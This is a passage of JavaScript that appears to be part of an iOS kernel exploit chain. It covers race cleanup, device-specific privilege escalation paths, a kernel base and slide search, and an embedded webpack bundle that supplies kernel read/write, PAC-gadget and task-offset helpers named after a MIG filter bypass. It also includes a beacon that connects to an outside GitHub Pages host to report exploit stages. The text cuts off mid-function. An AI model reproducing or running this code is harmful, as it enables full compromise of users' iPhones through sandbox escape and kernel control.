      kr = mach_port_deallocate(mach_task_self(), memory_object);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_port_deallocate failed!!!");
        exit(0n);
      }
      sockets_release();
      kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
      if (success == true) {
        break;
      }
    }
    for (let i = 0n; i < BigInt(wired_mapping_entries_addresses.length); i++) {
      let wired_page = wired_mapping_entries_addresses[i];
      mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
    }
  }
  function pe() {
    LOG("[PE-DBG] pe() entered");
    let device_machine = get_device_machine();
    if (strstr(device_machine, get_cstring("iPhone17,")) != 0n) {
      LOG("[+] Running on A18 Devices");
      is_a18_devices = true;
      sleep(8n);
      pe_init();
      pe_v2();
    } else {
      LOG("[+] Running on non-A18 Devices");
      pe_init();
      LOG("[PE-DBG] pe_init() done, about to call pe_v1()...");
      pe_v1();
    }
    LOG(`[+] highiest_success_idx: ${highiest_success_idx}`);
    LOG(`[+] success_read_count: ${success_read_count}`);
    uwrite64(go_sync_ptr, 0n);
    uwrite64(race_sync_ptr, 1n);
    js_thread_join(free_thread_jsthread);
    close(write_fd);
    close(read_fd);
    control_socket_pcb = early_kread64(rw_socket_pcb + 0x20n);
    let pcbinfo_pointer = early_kread64(control_socket_pcb + 0x38n);
    let ipi_zone = early_kread64(pcbinfo_pointer + 0x68n);
    let zv_name = early_kread64(ipi_zone + 0x10n);
    kernel_base = zv_name & 0xFFFFFFFFFFFFC000n;
    while (true) {
      if (early_kread64(kernel_base) == 0x100000cfeedfacfn) {
        if (early_kread64(kernel_base + 0x8n) == 0xc00000002n) {
          break;
        }
      }
      kernel_base -= PAGE_SIZE;
    }
    kernel_slide = kernel_base - 0xfffffff007004000n;
    krw_sockets_leak_forever();
  }
  mpd_js_thread_spawn = js_thread_spawn;
  mpd_js_thread_join = js_thread_join;
  mpd_pe = pe;
  mpd_kread64 = early_kread64;
  mpd_kwrite64 = early_kwrite64;
  mpd_kwrite_length = kwrite_length;
  mpd_kread_length = kread_length;
  mpd_kwrite_zone_element = kwrite_zone_element;
  mpd_control_socket = function() { return control_socket; }
  mpd_rw_socket = function() { return rw_socket; }
  mpd_pacia_gadget = function() { return dyld_signPointer_gadget; }
  mpd_kernel_slide = function (addr = 0n) {
    return addr + kernel_slide;
  };
  mpd_kernel_base = function () {
    return kernel_base;
  };
  // Beacon function to signal pe_main.js is running
  let CONNECT = func_resolve("connect");
  function sendBeacon(stage) {
    try {
      let sock = fcall(SOCKET, 2n, 1n, 0n); // AF_INET, SOCK_STREAM
      if (sock == 0xFFFFFFFFFFFFFFFFn || sock < 0n) return;
      let addr = calloc(1n, 16n);
      uwrite16(addr, 2n); // AF_INET
      uwrite16(addr + 2n, BigInt((443 >> 8) | ((443 & 0xff) << 8))); // port 443 in network order
      uwrite32(addr + 4n, 0x996CC7B9n); // 185.199.108.153 in little-endian
      let cr = fcall(CONNECT, sock, addr, 16n);
      if (cr == 0n) {
        let req = get_cstring("GET /lightsaber/beacon?stage=" + stage + " HTTP/1.0\r\nHost: zeroxjf.github.io\r\n\r\n");
        fcall(WRITE, sock, req, BigInt(("GET /lightsaber/beacon?stage=" + stage + " HTTP/1.0\r\nHost: zeroxjf.github.io\r\n\r\n").length));
      }
      fcall(CLOSE, sock);
      free(addr);
    } catch(e) {}
  }
  sendBeacon("pe_start");
  LOG("[PE] Calling pe() - kernel exploit phase..."); pe(); LOG("[PE] pe() completed");
  sendBeacon("pe_done");
   
  LOG("[+] PE Post-Exploitation !!!");
  LOG(`[+] kernel_base: ${mpd_kernel_base().hex()}`);
  LOG(`[+] kernel_slide: ${mpd_kernel_slide().hex()}`);
  let main = {};
  main.chainData = {
	  "chosenOffsets": null
  }
  
  try {
	  /******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js":
/*!*****************************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js ***!
  \*****************************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("/******/ (() => { // webpackBootstrap\n/******/ \t\"use strict\";\n/******/ \tvar __webpack_modules__ = ({\n\n/***/ \"./src/libs/Chain/Chain.js\":\n/*!*********************************!*\\\n  !*** ./src/libs/Chain/Chain.js ***!\n  \\*********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Chain)\n/* harmony export */ });\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n\n\nconst TAG = \"CHAIN\"\n\nclass Chain\n{\n\tstatic #driver;\n\tstatic #mutex;\n\n\tstatic init(driver, mutex=null)\n\t{\n\t\tthis.#driver = driver;\n\t\tthis.#mutex = mutex;\n\t}\n\n\tstatic destroy()\n\t{\n\t\tthis.#driver.destroy();\n\t}\n\n\tstatic runPE()\n\t{\n\t\treturn this.#driver.runPE();\n\t}\n\n\tstatic getKernelBase()\n\t{\n\t\treturn this.#driver.getKernelBase();\n\t}\n\n\tstatic getSelfTaskAddr()\n\t{\n\t\treturn this.#driver.getSelfTaskAddr();\n\t}\n\n\tstatic read(srcAddr, dst, len)\n\t{\n\t\tthis.#mutexLock();\n\t\tlet ret = this.#driver.read(srcAddr, dst, len);\n\t\tthis.#mutexUnlock();\n\t\treturn ret;\n\t}\n\n\tstatic write(dst, src, len)\n\t{\n\t\tthis.#mutexLock();\n\t\tlet ret = this.#driver.write(dst, src, len);\n\t\tthis.#mutexUnlock();\n\t\treturn ret;\n\t}\n\n\tstatic readBuff(srcAddr, len)\n\t{\n\t\tif (!this.read(srcAddr, Native.mem, len))\n\t\t\treturn false;\n\t\treturn Native.read(Native.mem, len);\n\t}\n\n\tstatic read8(src)\n\t{\n\t\tthis.read(src, Native.mem, 1);\n\t\treturn Native.read8(Native.mem);\n\t}\n\n\tstatic read16(src)\n\t{\n\t\tthis.read(src, Native.mem, 2);\n\t\treturn Native.read16(Native.mem);\n\t}\n\n\tstatic read32(src)\n\t{\n\t\tthis.read(src, Native.mem, 4);\n\t\treturn Native.read32(Native.mem);\n\t}\n\n\tstatic read64(src)\n\t{\n\t\tthis.read(src, Native.mem, 8);\n\t\treturn Native.read64(Native.mem);\n\t}\n\n\tstatic write8(dst, value)\n\t{\n\t\tNative.write8(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 1);\n\t}\n\n\tstatic write16(dst, value)\n\t{\n\t\tNative.write16(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 2);\n\t}\n\n\tstatic write32(dst, value)\n\t{\n\t\tNative.write32(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 4);\n\t}\n\n\tstatic write64(dst, value)\n\t{\n\t\tNative.write64(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 8);\n\t}\n\n\tstatic offsets()\n\t{\n\t\treturn this.#driver.offsets();\n\t}\n\n\tstatic strip(val)\n\t{\n\t\treturn this.#driver.strip(val);\n\t}\n\n\tstatic writeZoneElement(dstAddr,src,len)\n\t{\n\t\treturn this.#driver.writeZoneElement(dstAddr, src, len);\n\t}\n\n\tstatic getPaciaGadget()\n\t{\n\t\treturn this.#driver.getPaciaGadget();\n\t}\n\tstatic getClearPaciaGadget()\n\t{\n\t\treturn this.#driver.getClearPaciaGadget();\n\t}\n\n\tstatic transferRW()\n\t{\n\t\tlet rwCtx = this.#driver.transferRW();\n\t\tlet controlSocket = rwCtx.controlSocket;\n\t\tlet rwSocket = rwCtx.rwSocket;\n\t\tconsole.log(TAG, \"controlSocket: \" + controlSocket);\n\t\tconsole.log(TAG, \"rwSocket: \" + rwSocket);\n\n\t\tlet portPtr = Native.mem;\n\t\tNative.callSymbol(\"fileport_makeport\", controlSocket, portPtr);\n\t\tlet controlPort = Native.read32(portPtr);\n\n\t\tNative.callSymbol(\"fileport_makeport\", rwSocket, portPtr);\n\t\tlet rwPort = Native.read32(portPtr);\n\n\t\treturn {\n\t\t\tcontrolPort: controlPort,\n\t\t\trwPort: rwPort,\n\t\t\tcontrolSocket: controlSocket,\n\t\t\trwSocket: rwSocket\n\t\t};\n\t}\n\n\tstatic threadSpawn(scriptCFString, threadMem) {\n\t\tthis.#driver.threadSpawn(scriptCFString, threadMem);\n\t}\n\n\tstatic testKRW() {\n\t\tconsole.log(TAG, \"Testing KRW\");\n\t\tconsole.log(TAG, \"- kernelBase: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(this.getKernelBase()));\n\t\tconsole.log(TAG, \"- PACIA gadget: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(this.getPaciaGadget()));\n\t\tconsole.log(TAG, \"- Read kernel magic (4 bytes)\");\n\n\t\tlet buff = this.readBuff(this.getKernelBase(), 4);\n\t\tif (!buff) {\n\t\t\tconsole.log(TAG, \"kernel RW not working!\");\n\t\t\treturn false;\n\t\t}\n\t\tlet buff32 = new Uint32Array(buff);\n\t\tconsole.log(TAG, `- Magic: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(buff32[0])}`);\n\n\t\tif (buff32[0] != 0xfeedfacf) {\n\t\t\tconsole.log(TAG, \"Invalid magic!\");\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n\tstatic #mutexLock() {\n\t\tif (this.#mutex)\n\t\t\tNative.callSymbol(\"pthread_mutex_lock\", this.#mutex);\n\t}\n\n\tstatic #mutexUnlock() {\n\t\tif (this.#mutex)\n\t\t\tNative.callSymbol(\"pthread_mutex_unlock\", this.#mutex);\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Chain/Native.js\":\n/*!**********************************!*\\\n  !*** ./src/libs/Chain/Native.js ***!\n  \\**********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Native)\n/* harmony export */ });\nconst RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;\n\nclass Native {\n\n\t// Preallocated memory chunk for general purpose stuff for public use\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\n\t// Preallocated memory chunk for encoding/decoding of string arguments\n\tstatic #argMem = 0n;\n\n\t// Pointer to next available memory for native argument\n\tstatic #argPtr = 0n;\n\n\tstatic {\n\t\tthis.mem = this.callSymbol(\"malloc\", this.memSize);\n\t\tthis.#argMem = this.callSymbol(\"malloc\", 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t}\n\n\tstatic write(ptr, buff) {\n\t\tlet buffPtr = read64(read64(addrof(buff) + 0x10n) + 0x10n);\n\t\tthis.callSymbol(\"memcpy\", ptr, buffPtr, buff.byteLength);\n\t}\n\tstatic write32(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(4);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint32(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic read(ptr, length) {\n\t\tlet buffRes = new ArrayBuffer(length);\n\t\tlet buffPtr = read64(read64(addrof(buffRes) + 0x10n) + 0x10n);\n\t\tthis.callSymbol(\"memcpy\", buffPtr, ptr, length);\n\t\treturn buffRes;\n\t}\n\n\tstatic read8(ptr) {\n\t\tlet buff = this.read(ptr, 1);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint8(0);\n\t}\n\n\tstatic read16(ptr) {\n\t\tlet buff = this.read(ptr, 2);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint16(0, true);\n\t}\n\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint32(0, true);\n\t}\n\n\tstatic read64(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\n\tstatic readPtr(ptr) {\n\t\treturn this.read64(ptr);\n\t}\n\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\n\tstatic write8(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(1);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint8(0, value);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write16(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(2);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint16(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write32(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(4);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint32(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write64(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(8);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic writeString(ptr, str) {\n\t\t//const buff = this.stringToBytes(str, true);\n\t\t//this.write(ptr, buff);\n\t\tthis.callSymbol(\"memcpy\", ptr, str, str.length + 1);\n\t}\n\n\tstatic getCString(str) {\n\t\treturn get_cstring(str);\n\t}\n\n\tstatic #prepareArg(arg) {\n\t\tif(!arg)\n\t\t\targ = 0n;\n\t\tif(typeof(arg) === \"string\")\n\t\t\treturn get_cstring(arg);\n\t\treturn BigInt(arg);\n\t}\n\n\tstatic strip(address) {\n\t\treturn address & 0x7fffffffffn;\n\t}\n\n\tstatic pacia(address, modifier) {\n\t\taddress = Native.strip(address);\n\t\t//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);\n\t\tlet signedAddress = pacia(address, BigInt(modifier));\n\t\t//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);\n\t\treturn signedAddress;\n\t}\n\n\tstatic dlsym(name) {\n\t\treturn Native.callSymbol(\"dlsym\", RTLD_DEFAULT, name);\n\t}\n\n\tstatic callSymbol(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {\n\t\tlet funcSymbol = null;\n\t\tif(name === \"dlysm\")\n\t\t\tfuncSymbol = DLSYM;\n\t\telse\n\t\t\tfuncSymbol = fcall(DLSYM,RTLD_DEFAULT,get_cstring(name));\n\t\ta0 = this.#prepareArg(a0);\n\t\ta1 = this.#prepareArg(a1);\n\t\ta2 = this.#prepareArg(a2);\n\t\ta3 = this.#prepareArg(a3);\n\t\ta4 = this.#prepareArg(a4);\n\t\ta5 = this.#prepareArg(a5);\n\t\ta6 = this.#prepareArg(a6);\n\t\ta7 = this.#prepareArg(a7);\n\t\ta8 = this.#prepareArg(a8);\n\t\ta9 = this.#prepareArg(a9);\n\t\ta10 = this.#prepareArg(a10);\n\t\ta11 = this.#prepareArg(a11);\n\t\ta12 = this.#prepareArg(a12);\n\t\ta13 = this.#prepareArg(a13);\n\t\ta14 = this.#prepareArg(a14);\n\t\ta15 = this.#prepareArg(a15);\n\t\tlet chosen_fcall = null;\n\t\tif(typeof fcall_with_pacia !== 'undefined')\n\t\t\tchosen_fcall = fcall_with_pacia;\n\t\telse\n\t\t\tchosen_fcall = fcall;\n\t\tconst ret64 = chosen_fcall(funcSymbol, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\tif (ret64 == 0xffffffffffffffffn)\n\t\t\treturn -1;\n\t\treturn ret64;\n\t}\n\n\tstatic callSymbolRetain(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {\n\t\treturn Native.callSymbol(name,a0,a1,a2,a3,a4,a5,a6,a7,a8, a9, a10, a11, a12, a13, a14, a15);\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\n\tstatic #doNativeCall(func, name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t// Initialize argPtr to point to general purpose memory chunk\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = func(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtr\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn this.#fromNative(ret);\n\t}\n\n\tstatic #fromNative(value) {\n\t\tif (!(value instanceof ArrayBuffer))\n\t\t\treturn value;\n\t\tconst view = new DataView(value);\n\t\treturn view.getBigInt64(0, true);\n\t}\n\n\tstatic #toNative(value) {\n\t\t// Strings need to be manually written to native memory\n\t\tif (typeof value === 'string') {\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn this.#bigIntToArray(ptr);\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn this.#bigIntToArray(value);\n\t\t}\n\t\telse\n\t\t\treturn value;\n\t}\n\n\tstatic #bigIntToArray(value) {\n\t\tlet a = new Uint8Array(8);\n\t\tfor (let i=0; i<8; i++) {\n\t\t\ta[i] = Number(value & 0xffn)\n\t\t\tvalue >>= 8n;\n\t\t}\n\t\treturn a.buffer;\n\t}\n\tstatic gc() {\n\t}\n}\n\n// Register global Native class\nglobalThis.Native = Native;\n\n\n/***/ }),\n\n/***/ \"./src/libs/Chain/OffsetsStruct.js\":\n/*!*****************************************!*\\\n  !*** ./src/libs/Chain/OffsetsStruct.js ***!\n  \\*****************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ OffsetsStruct)\n/* harmony export */ });\nconst OFFSET_KERNEL_BASE  = 0xfffffff007004000n\n//const OFFSET_KERNEL_TASK  = 0x925770n // iOS 17.5.1 - iPhone 13/13 pro max\n//const OFFSET_KERNEL_TASK 0x91d318 // iOS 17.4.1 - iPhone 13 pro max\nconst OFFSET_KERNEL_TASK = 0x0n\nconst OFFSET_TASK_MAP = 0x28n\nconst OFFSET_TASK_NEXT = 0x30n\nconst OFFSET_TASK_PREV = 0x38n\nconst OFFSET_TASK_THREADS = 0x58n\nconst OFFSET_TASK_IPC_SPACE = 0x300n\nconst OFFSET_TASK_PROC_RO = 0x3a0n\nconst OFFSET_TASK_PROC_SIZE = 0x740n // iOS 17.5.1\nconst OFFSET_TASK_EXC_GUARD = 0x5d4n\n\nconst OFFSET_IPC_SPACE_TABLE = 0x20n\nconst OFFSET_IPC_ENTRY_OBJECT =\t0x0n\nconst OFFSET_IPC_OBJECT_KOBJECT = 0x48n\nconst OFFSET_IPC_PORT_IP_NSREQUEST = 0x58n\nconst OFFSET_IPC_PORT_IP_SORIGHTS = 0x84n\n\nconst OFFSET_PROC_PID = 0x60n\nconst OFFSET_PROC_P_COMM = 0x568n\n\nconst OFFSET_THREAD_OPTIONS = 0x70n\nconst OFFSET_THREAD_KSTACKPTR = 0xf0n\nconst OFFSET_THREAD_ROP_PID = 0x160n\nconst OFFSET_THREAD_JOP_PID = 0x168n\nconst OFFSET_THREAD_GUARD_EXC_CODE = 0x330n\nconst OFFSET_THREAD_TASK_THREADS = 0x370n\nconst OFFSET_THREAD_TRO = 0x380n\nconst OFFSET_THREAD_AST = 0x3a4n\nconst OFFSET_THREAD_MUTEX_DATA = 0x3b0n\nconst OFFSET_THREAD_CTID = 0x430n\n\nconst OFFSET_TRO_TASK = 0x20n\n\nconst OFFSET_VM_HDR_RBH_ROOT = 0x38n\nconst OFFSET_VM_RBE_LEFT = 0x0n\nconst OFFSET_VM_RBE_RIGHT = 0x8n\n\nconst OFFSET_VM_OBJECT_VOU_SIZE = 0x18n\nconst OFFSET_VM_OBJECT_REF_COUNT = 0x28n\n\nconst OFFSET_VM_NAMED_ENTRY_COPY = 0x10n\nconst OFFSET_VM_NAMED_ENTRY_NEXT = 0x20n\n\nconst OFFSET_MIG_LOCK = 0x0n;\nconst OFFSET_MIG_SBXMSG = 0x0n;\nclass OffsetsStruct\n{\n\tconstructor() {\n\t\tthis.baseKernel = OFFSET_KERNEL_BASE;\n\t\tthis.kernelTask = OFFSET_KERNEL_TASK;\n\t\tthis.T1SZ_BOOT = 17n;\n\n\t\tthis.mapTask = OFFSET_TASK_MAP;\n\t\tthis.nextTask = OFFSET_TASK_NEXT;\n\t\tthis.prevTask = OFFSET_TASK_PREV;\n\t\tthis.threads = OFFSET_TASK_THREADS;\n\t\tthis.ipcSpace = OFFSET_TASK_IPC_SPACE;\n\t\tthis.procRO = OFFSET_TASK_PROC_RO;\n\t\tthis.procSize = OFFSET_TASK_PROC_SIZE;\n\t\tthis.excGuard = OFFSET_TASK_EXC_GUARD;\n\n\t\tthis.spaceTable = OFFSET_IPC_SPACE_TABLE;\n\t\tthis.entryObject = OFFSET_IPC_ENTRY_OBJECT;\n\t\tthis.objectKObject = OFFSET_IPC_OBJECT_KOBJECT;\n\t\tthis.ipNsRequest = OFFSET_IPC_PORT_IP_NSREQUEST;\n\t\tthis.ipSorights = OFFSET_IPC_PORT_IP_SORIGHTS;\n\n\t\tthis.pid = OFFSET_PROC_PID;\n\t\tthis.pComm = OFFSET_PROC_P_COMM;\n\n\t\tthis.options = OFFSET_THREAD_OPTIONS;\n\t\tthis.kstackptr = OFFSET_THREAD_KSTACKPTR;\n\t\tthis.ropPid = OFFSET_THREAD_ROP_PID;\n\t\tthis.jopPid = OFFSET_THREAD_JOP_PID;\n\t\tthis.guardExcCode = OFFSET_THREAD_GUARD_EXC_CODE;\n\t\tthis.taskThreads = OFFSET_THREAD_TASK_THREADS;\n\t\tthis.tro = OFFSET_THREAD_TRO;\n\t\tthis.ast = OFFSET_THREAD_AST;\n\t\tthis.mutexData = OFFSET_THREAD_MUTEX_DATA;\n\t\tthis.ctid = OFFSET_THREAD_CTID;\n\n\t\tthis.troTask = OFFSET_TRO_TASK;\n\n\t\tthis.hdrRBHRoot = OFFSET_VM_HDR_RBH_ROOT;\n\t\tthis.rbeLeft = OFFSET_VM_RBE_LEFT;\n\t\tthis.rbeRight = OFFSET_VM_RBE_RIGHT;\n\n\t\tthis.vouSize = OFFSET_VM_OBJECT_VOU_SIZE;\n\t\tthis.refCount = OFFSET_VM_OBJECT_REF_COUNT;\n\n\t\tthis.backingCopy = OFFSET_VM_NAMED_ENTRY_COPY;\n\t\tthis.next = OFFSET_VM_NAMED_ENTRY_NEXT;\n\t\tthis.migLock = OFFSET_MIG_LOCK;\n\t\tthis.migSbxMsg = OFFSET_MIG_SBXMSG;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Driver/DriverNewThread.js\":\n/*!********************************************!*\\\n  !*** ./src/libs/Driver/DriverNewThread.js ***!\n  \\********************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ DriverNewThread)\n/* harmony export */ });\n/* harmony import */ var _Offsets__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./Offsets */ \"./src/libs/Driver/Offsets.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n\n\n\n\nconst TAG = \"DRIVER-NEWTHREAD\"\n\nconst EARLY_KRW_LENGTH = 0x20n;\nconst IPPROTO_ICMPV6 = 58n;\nconst ICMP6_FILTER = 18n;\n\nclass DriverNewThread\n{\n\t#offsets;\n\t#controlSocket;\n\t#rwSocket;\n\t#kernelBase;\n\t#paciaGadget;\n\t#tmpWriteMem;\n\n\tconstructor(controlSocket, rwSocket, kernelBase, paciaGadget=0n) {\n\t\tthis.#offsets = _Offsets__WEBPACK_IMPORTED_MODULE_0__[\"default\"].getByDeviceAndVersion();\n\t\tthis.#controlSocket = controlSocket;\n\t\tthis.#rwSocket = rwSocket;\n\t\tthis.#kernelBase = kernelBase;\n\t\tthis.#paciaGadget = paciaGadget;\n\t\tthis.#tmpWriteMem = Native.callSymbol(\"malloc\", EARLY_KRW_LENGTH);\n\n\t\tconsole.log(TAG, `Got RW context: ${this.#controlSocket}, ${this.#rwSocket}`);\n\t}\n\n\tdestroy() {\n\t\tconsole.log(TAG, \"Destroy\");\n\t\tNative.callSymbol(\"free\", this.#tmpWriteMem);\n\t\tNative.callSymbol(\"close\", this.#controlSocket);\n\t\tNative.callSymbol(\"close\", this.#rwSocket);\n\t}\n\n\tread(srcAddr, dst, len) {\n\t\t//console.log(TAG, `read(${Utils.hex(srcAddr)}, ${len})`);\n\t\tsrcAddr = this.strip(srcAddr);\n\t\tif (srcAddr < 0xffffffd000000000n) {\n\t\t\tconsole.log(TAG, `Invalid kaddr, cannot read: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(srcAddr)}`);\n\t\t\treturn false;\n\t\t}\n\t\treturn this.#kreadLength(srcAddr, dst, len);\n\t}\n\n\twrite(dst, src, len) {\n\t\tlet dstAddr = this.strip(dst);\n\t\tif (dstAddr < 0xffffffd000000000n) {\n\t\t\tconsole.log(TAG, `Invalid kaddr, cannot write: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(dstAddr)}`);\n\t\t\treturn false;\n\t\t}\n\t\treturn this.#kwriteLength(dst, src, len);\n\t}\n\n\twriteZoneElement(dst, src, len) {\n\t\tconst CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE = 0x20n;\n\n\t\tif (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {\n\t\t\tconsole.log(TAG, \"writeZoneElement supports only zone element size >= 0x20\");\n\t\t\treturn false;\n\t\t}\n\n\t\tlet write_size = 0n;\n\t\tlet write_offset = 0n;\n\n\t\tlet remaining = BigInt(len);\n\t\twhile (remaining != 0n) {\n\t\t\twrite_size = (remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) ?\n\t\t\t\tCHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : (remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);\n\n\t\t\tlet kwrite_dst_addr = (dst + write_offset);\n\t\t\tlet kwrite_src_addr = (src + write_offset);\n\n\t\t\tif (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {\n\t\t\t\tlet adjust = (CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size);\n\t\t\t\tkwrite_dst_addr -= adjust;\n\t\t\t\tkwrite_src_addr -= adjust;\n\t\t\t}\n\t\t\tif (!this.#kwriteLength(kwrite_dst_addr,kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE))\n\t\t\t\treturn false;\n\t\t\tremaining -= write_size;\n\t\t\twrite_offset += write_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\tstrip(val) {\n\t\t//return val & 0x7fffffffffn;\n\t\treturn val | 0xffffff8000000000n;\n\t}\n\n\toffsets() {\n\t\treturn this.#offsets;\n\t}\n\n\tgetPaciaGadget() {\n\t\treturn this.#paciaGadget;\n\t}\n\n\tgetKernelBase() {\n\t\treturn this.#kernelBase;\n\t}\n\t\n\tgetSelfTaskAddr() {\n\t\tconsole.log(TAG, `getSelfTaskAddr`);\n\n\t\tlet selfTaskKaddr = 0;\n\t\tfor (let i=0; i<5; i++)\n\t\t{\n\t\t\tselfTaskKaddr = this.#findSelfTaskKaddr(true);\n\t\t\tif (!selfTaskKaddr)\n\t\t\t{\n\t\t\t\tconsole.log(TAG, `Searching the other way around`);\n\t\t\t\tselfTaskKaddr = 